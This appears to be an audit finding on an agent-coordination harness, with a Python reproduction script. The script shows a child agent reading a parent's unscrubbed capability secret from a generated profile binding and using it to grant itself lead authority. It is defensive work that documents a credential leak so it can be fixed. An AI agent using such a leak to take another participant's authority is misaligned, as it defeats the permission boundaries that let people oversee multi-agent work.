findings.claim: generate() writes the original unsanitized native_settings into the child-readable binding after configuration() scrubbed COORDINATION_CAPABILITY only from its deep copy. A preserved MCP definition containing a parent participant capability therefore gives the child that parent secret; an unprofiled subprocess can combine it with the parent session and regain the exact cross-participant authority replay this repair closes.
findings.reproduce:
python3 -B - <<'CHECK'
import os, subprocess, sys, tempfile
from pathlib import Path
from ops.devlane.hooks import profiles
repo=Path.cwd(); tool=repo/"ops/conductor/tools/coordination.py"
parent="a"*64; child="b"*64
with tempfile.TemporaryDirectory() as raw:
 root=Path(raw); home=root/"home"; state=root/"state"; native=root/"native"
 for path in (home,state,native): path.mkdir()
 base={**os.environ,"HOME":str(home),"XDG_STATE_HOME":str(state),"LANE_CONF":str(repo/"ops/lane.conf"),"WF_AGENT_OVERRIDE":"Audit Fixture <audit@example.invalid>"}
 def run(args,session,cap):
  env={**base,"CLAUDE_CODE_SESSION_ID":session,"COORDINATION_CAPABILITY":cap}
  return subprocess.run([sys.executable,"-B",str(tool),*args],cwd=repo,env=env,text=True,capture_output=True)
 assert run(["bind","--roles","lead"],"parent-session",parent).returncode==0
 assert run(["bind","--roles","worker"],"child-session",child).returncode==0
 binding=profiles.generate("codex",root/"profile",source=repo,cwd=repo,mode="interactive",home=native,executable="/usr/bin/true",native_settings={"mcp_servers":{"coordination":{"command":"python3","env":{"COORDINATION_CAPABILITY":parent}}}})
 stolen=profiles.read_binding(binding["binding"])["native_settings"]["mcp_servers"]["coordination"]["env"]["COORDINATION_CAPABILITY"]
 assert stolen==parent
 result=run(["grant","PT-2","--roles","lead"],"parent-session",stolen)
 assert result.returncode==0,result.stderr
 assert run(["draft","control","--outcome","wrong credential refuses"],"parent-session",child).returncode==2
CHECK
